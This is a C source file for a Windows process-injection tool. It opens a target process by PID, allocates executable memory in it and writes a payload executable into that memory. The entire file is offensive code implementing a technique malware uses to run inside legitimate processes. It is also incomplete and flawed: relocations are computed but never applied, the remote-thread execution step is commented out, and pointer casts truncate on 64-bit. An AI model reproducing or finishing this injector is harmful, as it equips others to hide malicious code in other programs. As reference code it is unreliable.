// PE-Injector - Inject PE file using PE-Injection technique
// Pass the PID of the process to inject to, with the path of to the injected executable.
// Usage: PE_Injection.exe <PID> <EXECUTABLE_PATH>

#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <libloaderapi.h>


typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


int main(int argc, char ** argv)
{
	int pid;
	int SizeofImage;
	HANDLE hMapObject, hFile, hTargetProc;
	LPVOID lpBase;
	PVOID pProcBase = GetModuleHandleA(NULL);
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeader;

	if (argc < 3) {
		printf("[*] Usage: PE_Injection.exe <PID> <EXECUTABLE_PATH>\n");
		return 1;

	}

	if (strspn(argv[1], "0123456789") == strlen(argv[1])) {
		pid = atoi(argv[1]);
	}

	else {
		printf("[!] Bad PID argument - numbers only\n");
		return 2;

	}

	printf("[*] Payload Path: %s\n", argv[2]);
	printf("[*] PID of the target process: %d\n", pid);

	hFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Error with open the file");
		return 3;
	}

	hMapObject = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	lpBase = MapViewOfFile(hMapObject, FILE_MAP_READ, 0, 0, 0);

	if (!lpBase) {
		printf("[!] Unable to Create File Map Object - Failed");
		return 6;
	}

	dosHeader = (PIMAGE_DOS_HEADER)lpBase;
	ntHeader = (PIMAGE_NT_HEADERS)((DWORD)(dosHeader)+(dosHeader->e_lfanew));

	SizeofImage = ntHeader->OptionalHeader.SizeOfImage;

	printf("[+] Size of Image: %x\n", SizeofImage);

	printf("[+] Allocating Image within the injector\n");

	PVOID localImage = VirtualAlloc(NULL, SizeofImage, MEM_COMMIT, PAGE_READWRITE);
	ReadFile(hFile, localImage, SizeofImage, NULL, NULL);

	printf("[+] Allocated Image Address: %p\n", localImage);

	printf("[*] Receiving Handle to target process\n");

	hTargetProc = OpenProcess(MAXIMUM_ALLOWED, 0, pid);

	if (hTargetProc == NULL) {

		printf("[!] Failed receiving handle to target process\n");
		return 4;

	}

	printf("[*] Allocating memory in target process\n");

	PVOID pImageTarget = VirtualAllocEx(hTargetProc, NULL, SizeofImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (pImageTarget == NULL) {

		printf("[!] Failed allocating memory in the target process\n");
		return 5;

	}

	printf("[+] Target Image in remote process: %p\n", pImageTarget);

	printf("[*] Starting Realocation...\n");

	// Relocation Calc
	DWORD_PTR newDelta = (DWORD_PTR)((DWORD)pImageTarget - ntHeader->OptionalHeader.ImageBase);
	DWORD_PTR oldDelta = (DWORD_PTR)((DWORD)pProcBase - ntHeader->OptionalHeader.ImageBase);

	/* Point to first relocation block copied in temporary buffer */
	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	printf("[*] Old Delta: %lx\n", oldDelta);

	printf("[*] First Relocation block: %p\n", reloc);

	printf("[*] Writing payload to memory...\n");

	if (WriteProcessMemory(hTargetProc, pImageTarget, localImage, SizeofImage, NULL)) {

		printf("[+] Code successfully injected into process with PID: %d\n", pid);

	}

	//printf("[*] Executing Main Thread\n");

	// Need to find the entry point within the current process
	//CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)epNew, NULL, 0, NULL);

	//printf("[+] Check Injection Note\n");

	CloseHandle(hTargetProc);
	UnmapViewOfFile(hMapObject);
	CloseHandle(hFile);

	return 0;

}
